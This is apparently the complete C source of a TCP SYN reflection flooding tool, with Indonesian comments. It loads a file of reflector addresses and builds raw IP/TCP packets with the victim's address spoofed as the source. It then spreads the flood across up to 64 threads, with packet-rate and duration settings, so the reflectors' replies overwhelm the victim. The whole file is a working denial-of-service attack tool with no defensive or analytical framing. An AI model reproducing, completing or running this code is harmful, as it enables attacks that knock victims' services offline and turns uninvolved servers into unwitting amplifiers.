#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>
#include <errno.h>

#define MAX_REFLECTORS 65536
#define MAX_THREADS 64

typedef struct {
    char ip[32];
    int port;
} reflector_t;

typedef struct {
    reflector_t *reflectors;
    int start_idx;
    int end_idx;
    char spoof_ip[32];
    int spoof_port;
    int pps;       // packets per second (-1 unlimited)
    int duration;  // in seconds
} thread_data_t;

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short) ~sum;

    return answer;
}

struct pseudo_header {
    u_int32_t src;
    u_int32_t dst;
    u_int8_t zero;
    u_int8_t protocol;
    u_int16_t tcp_len;
};

void *sender_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    // Set IP_HDRINCL
    int one = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(s);
        pthread_exit(NULL);
    }

    // Set send buffer to 10MB
    int sndbuf = 10*1024*1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    char datagram[4096];
    struct sockaddr_in sin;
    int count = 0;

    struct timespec ts_start, ts_now;
    clock_gettime(CLOCK_MONOTONIC, &ts_start);

    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &ts_now);
        double elapsed = ts_now.tv_sec - ts_start.tv_sec + (ts_now.tv_nsec - ts_start.tv_nsec) / 1e9;
        if (elapsed > data->duration) break;

        for (int i = data->start_idx; i < data->end_idx; i++) {
            if (data->pps > 0) {
                // rate limit
                if (count >= data->pps) {
                    struct timespec sleep_ts = {0, 1000000000L}; // 1 sec
                    nanosleep(&sleep_ts, NULL);
                    count = 0;
                    clock_gettime(CLOCK_MONOTONIC, &ts_start);
                }
            }

            memset(datagram, 0, sizeof(datagram));
            struct iphdr *iph = (struct iphdr *)datagram;
            struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

            sin.sin_family = AF_INET;
            sin.sin_port = htons(data->reflectors[i].port);
            sin.sin_addr.s_addr = inet_addr(data->reflectors[i].ip);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            iph->id = htons(rand() % 65535);
            iph->frag_off = 0;
            iph->ttl = 64;
            iph->protocol = IPPROTO_TCP;
            iph->check = 0;
            iph->saddr = inet_addr(data->spoof_ip);
            iph->daddr = sin.sin_addr.s_addr;
            iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));

            tcph->source = htons(data->spoof_port);
            tcph->dest = htons(data->reflectors[i].port);
            tcph->seq = htonl(rand());
            tcph->ack_seq = 0;
            tcph->doff = 5;
            tcph->syn = 1;
            tcph->window = htons(5840);
            tcph->check = 0;
            tcph->urg_ptr = 0;

            struct pseudo_header psh;
            char pseudo_packet[4096];
            psh.src = iph->saddr;
            psh.dst = iph->daddr;
            psh.zero = 0;
            psh.protocol = IPPROTO_TCP;
            psh.tcp_len = htons(sizeof(struct tcphdr));

            memcpy(pseudo_packet, &psh, sizeof(psh));
            memcpy(pseudo_packet + sizeof(psh), tcph, sizeof(struct tcphdr));
            tcph->check = checksum((unsigned short *)pseudo_packet, sizeof(psh) + sizeof(struct tcphdr));

            if (sendto(s, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
                if(errno != EPERM && errno != EACCES) {
                    perror("sendto failed");
                }
            } else {
                // bisa komen baris ini supaya gak kebanyakan print
                //printf("Sent spoofed SYN to %s:%d from %s:%d\n", data->reflectors[i].ip, data->reflectors[i].port, data->spoof_ip, data->spoof_port);
            }

            count++;
        }
    }

    close(s);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        printf("usage: %s {ip} {port} {reflector file} {pps -1 unlimited} {thread} {time}\n", argv[0]);
        return 1;
    }

    char *spoof_ip = argv[1];
    int spoof_port = atoi(argv[2]);
    char *filename = argv[3];
    int pps = atoi(argv[4]);
    int num_threads = atoi(argv[5]);
    int duration = atoi(argv[6]);

    if (num_threads <= 0 || num_threads > MAX_THREADS) {
        printf("thread count must be 1-%d\n", MAX_THREADS);
        return 1;
    }

    reflector_t *reflectors = malloc(sizeof(reflector_t) * MAX_REFLECTORS);
    if (!reflectors) {
        perror("malloc");
        return 1;
    }

    FILE *fp = fopen(filename, "r");
    if (!fp) {
        perror("file open failed");
        free(reflectors);
        return 1;
    }

    int count = 0;
    while (count < MAX_REFLECTORS && fscanf(fp, "%31s %d", reflectors[count].ip, &reflectors[count].port) == 2) {
        count++;
    }
    fclose(fp);

    if (count == 0) {
        printf("no reflectors loaded\n");
        free(reflectors);
        return 1;
    }

    printf("Loaded %d reflectors.\n", count);

    pthread_t threads[num_threads];
    thread_data_t thread_data[num_threads];

    int chunk = count / num_threads;
    int remainder = count % num_threads;
    int start = 0;

    for (int i = 0; i < num_threads; i++) {
        thread_data[i].reflectors = reflectors;
        thread_data[i].start_idx = start;
        thread_data[i].end_idx = start + chunk + (i < remainder ? 1 : 0);
        strncpy(thread_data[i].spoof_ip, spoof_ip, sizeof(thread_data[i].spoof_ip)-1);
        thread_data[i].spoof_ip[sizeof(thread_data[i].spoof_ip)-1] = '\0';
        thread_data[i].spoof_port = spoof_port;
        thread_data[i].pps = pps / num_threads; // bagi rata pps ke thread
        thread_data[i].duration = duration;

        start = thread_data[i].end_idx;

        if (pthread_create(&threads[i], NULL, sender_thread, &thread_data[i]) != 0) {
            perror("pthread_create");
            free(reflectors);
            return 1;
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(reflectors);

    return 0;
}
